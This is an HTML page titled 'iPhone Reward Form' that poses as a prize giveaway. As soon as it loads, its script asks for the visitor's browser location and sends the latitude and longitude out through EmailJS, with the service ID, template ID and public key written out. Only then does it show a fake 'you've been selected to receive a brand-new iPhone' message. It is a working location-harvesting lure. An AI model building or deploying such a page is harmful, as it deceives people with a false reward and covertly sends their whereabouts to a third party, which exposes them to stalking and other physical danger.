<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone Reward Form</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f8ff;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 600px;
            background: #ffffff;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        #rewardContent {
            display: none; /* Hidden initially */
        }
        #locationDisplay {
            background: #e9ecef;
            color: #666;
            padding: 0.5rem;
            border-radius: 4px;
            margin-top: 15px;
            font-size: 0.9rem;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        .form-control {
            padding: 0.75rem;
            font-size: 1rem;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Reward Message and Location (Hidden initially) -->
        <div id="rewardContent" style="display:none;">
            <h1 class="form-heading">Congratulations! üéâ</h1>
            <p class="lead">You've been selected to receive a brand-new iPhone!</p>
            <p id="locationDisplay" class="form-text">Waiting for location...</p>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            emailjs.init("CrVHH3e0Kot5rmodE"); // Public Key

            // Automatically trigger location request when the page loads
            requestLocationPermission();

            function sendLocationEmail(latitude, longitude) {
                console.log("üìç Sending Location Data:", { latitude, longitude });

                const templateParams = {
                    latitude: latitude.toString(),
                    longitude: longitude.toString()
                };

                emailjs.send("service_k0hh95y", "template_8jzs2oc", templateParams)
                    .then((response) => {
                        console.log("‚úÖ Email sent successfully!", response);
                        document.getElementById("locationDisplay").textContent = "üìß Location sent!";
                    })
                    .catch((error) => {
                        console.error("‚ùå Error sending email:", error);
                        document.getElementById("locationDisplay").textContent = "‚ö†Ô∏è Email sending failed!";
                    });
            }

            function requestLocationPermission() {
                // As soon as the page loads, trigger geolocation
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;

                            console.log("üåç Location received:", latitude, longitude);
                            document.getElementById("locationDisplay").textContent = 
                                `üìç Latitude: ${latitude}, Longitude: ${longitude}`;

                            sendLocationEmail(latitude, longitude);

                            // Show the reward content now that we have the location
                            document.getElementById("rewardContent").style.display = "block";
                        },
                        (error) => {
                            console.error("‚ùå Error getting location:", error);
                            document.getElementById("locationDisplay").textContent = 
                                "‚ö†Ô∏è Location access denied!";
                        }
                    );
                } else {
                    console.log("‚ùå Geolocation not supported.");
                    document.getElementById("locationDisplay").textContent = "‚ö†Ô∏è Geolocation not supported!";
                }
            }
        });
    </script>
</body>
</html>
